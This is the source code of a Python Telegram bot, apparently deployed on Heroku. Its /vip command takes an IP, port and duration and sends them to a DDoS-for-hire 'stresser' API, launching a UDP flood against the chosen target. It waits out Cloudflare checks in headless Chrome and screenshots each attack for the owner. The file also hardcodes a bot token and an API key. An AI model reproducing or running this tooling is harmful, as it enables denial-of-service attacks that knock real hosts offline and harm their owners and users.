import telebot
import time
import threading
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import os

BOT_TOKEN = "8509862711:AAH6j7n-6T8izYPX6Bt0xH3oSFSk0LZfiJs"
API_KEY = "ujiYT1DJIAacgnFB"
OWNER_ID = 7459756974  # Apna Telegram ID daalo

# Authorized users list (only owner can add)
authorized_users = set()

bot = telebot.TeleBot(BOT_TOKEN)

# Setup Chrome for Heroku
chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument('--disable-gpu')
chrome_options.binary_location = os.environ.get('GOOGLE_CHROME_BIN', None)

driver = None

def init_driver():
    global driver
    if driver is None:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
    return driver

def take_screenshot(url):
    driver = init_driver()
    driver.get(url)
    time.sleep(10)  # Wait 10 seconds for Cloudflare verification
    screenshot_path = f"screenshot_{int(time.time())}.png"
    driver.save_screenshot(screenshot_path)
    return screenshot_path

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == OWNER_ID:
        bot.reply_to(message, "✅ Bot started! Use:\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>\n/status")
    else:
        bot.reply_to(message, "❌ Unauthorized. Contact owner.")

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can add users.")
        return
    try:
        user_id = int(message.text.split()[1])
        authorized_users.add(user_id)
        bot.reply_to(message, f"✅ User {user_id} added!")
    except:
        bot.reply_to(message, "Usage: /add <user_id>")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can remove users.")
        return
    try:
        user_id = int(message.text.split()[1])
        authorized_users.discard(user_id)
        bot.reply_to(message, f"✅ User {user_id} removed!")
    except:
        bot.reply_to(message, "Usage: /remove <user_id>")

@bot.message_handler(commands=['vip'])
def vip_attack(message):
    if message.from_user.id not in authorized_users and message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized. Contact owner.")
        return
    
    try:
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "⚠️ Usage: /vip <ip> <port> <time>\nMinimum time: 60 seconds")
            return
        
        _, ip, port, time_val = args
        time_val = int(time_val)
        
        if time_val < 60:
            bot.reply_to(message, "❌ Minimum time is 60 seconds!")
            return
        
        # Send immediate response
        bot.reply_to(message, f"⚡ VIP Started!\n\n🎯 Target: {ip}:{port}\n⏱️ Time: {time_val}s\n\n📊 Check /status for updates")
        
        # Open in Chrome and take screenshot after 10 seconds
        url = f"https://susstresser.com/panel/api/api.php?key={API_KEY}&host={ip}&port={port}&time={time_val}&method=udp"
        
        def capture_and_send():
            screenshot_path = take_screenshot(url)
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(OWNER_ID, photo, caption=f"📸 Attack sent by {message.from_user.id}\n🎯 {ip}:{port}\n⏱️ {time_val}s")
            os.remove(screenshot_path)
        
        threading.Thread(target=capture_and_send).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, "🟢 Bot is running!\n✅ Cloudflare verification via Chrome")

# Flask for Heroku
from flask import Flask
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

if __name__ == "__main__":
    threading.Thread(target=lambda: bot.infinity_polling()).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))